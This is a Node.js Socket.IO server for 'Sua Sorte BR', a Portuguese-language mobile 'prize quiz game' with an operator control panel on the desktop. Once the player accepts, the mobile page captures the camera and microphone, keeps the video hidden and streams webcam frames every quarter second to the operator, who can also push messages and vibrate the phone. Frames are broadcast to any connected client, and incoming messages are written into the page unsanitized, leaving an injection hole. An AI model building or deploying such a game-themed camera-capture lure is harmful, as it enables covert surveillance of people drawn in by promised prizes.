const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { 
  cors: { origin: "*" },
  pingTimeout: 60000,
  pingInterval: 25000
});

const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  const ua = req.headers['user-agent']?.toLowerCase() || '';
  const isMobile = /mobile|android|iphone/i.test(ua);
  const host = req.headers.host;
  const protocol = req.headers['x-forwarded-proto'] || 'http';
  const fullUrl = `${protocol}://${host}`;

  res.send(isMobile ? getMobileHTML(fullUrl) : getDesktopHTML(fullUrl));
});

// ==================== CELULAR - SUA SORTE BR ====================
function getMobileHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
    <title>Sua Sorte BR</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a0a0a, #1a0033);
            color: white;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        .header {
            background: linear-gradient(to right, #ff00cc, #00ffcc);
            padding: 15px 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            box-shadow: 0 4px 20px rgba(255, 0, 204, 0.5);
            z-index: 10;
        }
        .header h1 {
            font-size: 22px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
        }

        .consent-screen {
            position: absolute;
            inset: 0;
            background: rgba(10,10,10,0.98);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            padding: 20px;
        }
        .consent-box {
            background: #1f0033;
            border: 3px solid #ff00cc;
            border-radius: 20px;
            padding: 30px 25px;
            max-width: 340px;
            text-align: center;
            box-shadow: 0 0 40px rgba(255, 0, 204, 0.6);
        }
        .consent-box h2 {
            color: #ff00cc;
            margin-bottom: 20px;
            font-size: 24px;
        }
        .consent-box p {
            margin-bottom: 25px;
            line-height: 1.5;
            font-size: 15px;
        }
        .start-btn {
            background: linear-gradient(to right, #ff00cc, #00ff88);
            color: black;
            font-weight: bold;
            border: none;
            padding: 16px 40px;
            border-radius: 50px;
            font-size: 17px;
            width: 100%;
            cursor: pointer;
            margin-top: 15px;
        }

        .game-screen {
            display: none;
            height: 100vh;
            flex-direction: column;
        }

        .messages {
            flex: 1;
            overflow-y: auto;
            padding: 20px 16px;
            background: rgba(0,0,0,0.6);
        }
        .message {
            margin-bottom: 12px;
            animation: fadeIn 0.3s;
        }
        .message.sent { text-align: right; }
        .message.received { text-align: left; }
        .bubble {
            display: inline-block;
            padding: 12px 16px;
            border-radius: 18px;
            max-width: 80%;
        }
        .message.sent .bubble { background: #00ff88; color: black; }
        .message.received .bubble { background: #ff00cc; color: white; }

        .input-area {
            background: #1a0033;
            padding: 12px;
            display: flex;
            gap: 10px;
        }
        .input-field {
            flex: 1;
            background: #2a0044;
            border: none;
            border-radius: 30px;
            padding: 14px 18px;
            color: white;
            font-size: 16px;
        }
        .send-btn {
            background: #00ff88;
            color: black;
            border: none;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            font-size: 22px;
            cursor: pointer;
        }

        .question-area {
            background: #2a0044;
            padding: 15px;
            text-align: center;
            border-top: 3px solid #ff00cc;
        }
        .question {
            font-size: 18px;
            margin-bottom: 10px;
            font-weight: 600;
        }
        .timer {
            font-size: 28px;
            font-weight: bold;
            color: #ff00cc;
        }
    </style>
</head>
<body>

    <!-- TELA DE CONSENTIMENTO -->
    <div class="consent-screen" id="consentScreen">
        <div class="consent-box">
            <h2>🔥 SUA SORTE BR 🔥</h2>
            <p><strong>Este é um jogo de perguntas em tempo real.</strong></p>
            <p>O operador no PC controla as perguntas e os prêmios.</p>
            <p><strong>Importante:</strong><br>
            Ao continuar você autoriza:<br>
            • Uso da câmera<br>
            • Uso do microfone<br>
            • Compartilhamento de localização em tempo real</p>
            <p>Todas as suas respostas, vídeo e áudio serão enviados ao operador.</p>
            <button class="start-btn" id="acceptBtn">ACEITAR E JOGAR</button>
        </div>
    </div>

    <!-- TELA DO JOGO -->
    <div class="game-screen" id="gameScreen">
        <div class="header">
            <h1>Sua Sorte BR</h1>
        </div>

        <div class="messages" id="messages"></div>

        <div class="question-area" id="questionArea">
            <div class="question" id="questionText">Aguardando pergunta...</div>
            <div class="timer" id="timer">00</div>
        </div>

        <div class="input-area">
            <input type="text" class="input-field" id="messageInput" placeholder="Digite sua resposta ou mensagem...">
            <button class="send-btn" id="sendBtn">➤</button>
        </div>
    </div>

    <video id="localVideo" autoplay playsinline muted style="display:none;"></video>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');

        let mediaStream = null;
        let facingMode = 'user';
        let permissions = false;
        let frameInterval = null;

        const consentScreen = document.getElementById('consentScreen');
        const gameScreen = document.getElementById('gameScreen');
        const messagesDiv = document.getElementById('messages');
        const messageInput = document.getElementById('messageInput');
        const sendBtn = document.getElementById('sendBtn');
        const questionText = document.getElementById('questionText');
        const timerEl = document.getElementById('timer');

        function addMessage(text, isSent = true) {
            const div = document.createElement('div');
            div.className = \`message \${isSent ? 'sent' : 'received'}\`;
            div.innerHTML = \`<div class="bubble">\${text}</div>\`;
            messagesDiv.appendChild(div);
            div.scrollIntoView({ behavior: 'smooth' });
        }

        async function startGame() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode },
                    audio: true
                });

                mediaStream = stream;
                document.getElementById('localVideo').srcObject = stream;

                frameInterval = setInterval(() => {
                    if (permissions) {
                        const canvas = document.createElement('canvas');
                        canvas.width = 240; canvas.height = 180;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(document.getElementById('localVideo'), 0, 0, 240, 180);
                        socket.emit('frame', canvas.toDataURL('image/jpeg', 0.65));
                    }
                }, 250);

                permissions = true;
                consentScreen.style.display = 'none';
                gameScreen.style.display = 'flex';
                socket.emit('mobile_online');

            } catch (err) {
                alert("Você precisa permitir câmera e microfone para jogar.");
            }
        }

        sendBtn.onclick = () => {
            const text = messageInput.value.trim();
            if (text) {
                addMessage(text, true);
                socket.emit('message', text);
                messageInput.value = '';
            }
        };

        messageInput.addEventListener('keypress', e => {
            if (e.key === 'Enter') sendBtn.click();
        });

        // Socket Events
        socket.on('question', (data) => {
            questionText.textContent = data.question;
            timerEl.textContent = data.time || '30';
        });

        socket.on('message', msg => addMessage(msg, false));
        socket.on('frame', () => {}); // PC recebe

        document.getElementById('acceptBtn').onclick = startGame;

        socket.on('mobile_online', () => console.log('Conectado'));
    </script>
</body>
</html>`;
}

// ==================== DESKTOP - CONTROLE ====================
function getDesktopHTML(fullUrl) {
  return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Sua Sorte BR - Controle</title>
    <style>
        body { font-family: 'Poppins', sans-serif; background: #0a0a0a; color: white; margin:0; padding:20px; }
        h1 { color: #ff00cc; text-align:center; margin-bottom:20px; }
        .controls { display: grid; gap: 15px; max-width: 800px; margin: 0 auto; }
        button {
            padding: 15px;
            font-size: 16px;
            background: linear-gradient(#ff00cc, #00ffcc);
            color: black;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
        }
        input, textarea { width: 100%; padding: 12px; margin: 8px 0; background: #1f1f1f; border: 1px solid #ff00cc; color: white; border-radius: 8px; }
    </style>
</head>
<body>
    <h1>🎰 SUA SORTE BR - CONTROLE</h1>
    <div class="controls">
        <input type="text" id="questionInput" placeholder="Digite a pergunta...">
        <input type="number" id="timeInput" value="30" placeholder="Tempo em segundos">
        <input type="number" id="prizeInput" value="50" placeholder="Valor do prêmio">
        <button onclick="sendQuestion()">Enviar Pergunta</button>
        <button onclick="sendMessage()">Enviar Mensagem para Celular</button>
        <button onclick="toggleCamera()">Trocar Câmera</button>
        <button onclick="vibrate()">Vibrar Celular</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io('${fullUrl}');

        function sendQuestion() {
            const question = document.getElementById('questionInput').value;
            const time = document.getElementById('timeInput').value;
            socket.emit('question', { question, time });
        }

        function sendMessage() {
            const msg = prompt("Digite a mensagem para o celular:");
            if (msg) socket.emit('message', msg);
        }

        function toggleCamera() { socket.emit('toggle_camera'); }
        function vibrate() { socket.emit('vibrate'); }

        socket.on('frame', (frame) => {
            // Aqui você pode exibir o vídeo se quiser
            console.log('Frame recebido');
        });
    </script>
</body>
</html>`;
}

// Socket.IO - Controle básico
io.on('connection', (socket) => {
  console.log('Cliente conectado');

  socket.on('message', (msg) => socket.broadcast.emit('message', msg));
  socket.on('frame', (frame) => socket.broadcast.emit('frame', frame));
  socket.on('question', (data) => socket.broadcast.emit('question', data));
  socket.on('toggle_camera', () => socket.broadcast.emit('toggle_camera'));
  socket.on('vibrate', () => socket.broadcast.emit('vibrate'));
  socket.on('mobile_online', () => socket.broadcast.emit('mobile_online'));
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`\n🔥 Sua Sorte BR rodando na porta ${PORT}`);
  console.log(`Celular: http://[SEU-IP]:${PORT}`);
  console.log(`PC: http://localhost:${PORT}\n`);
});
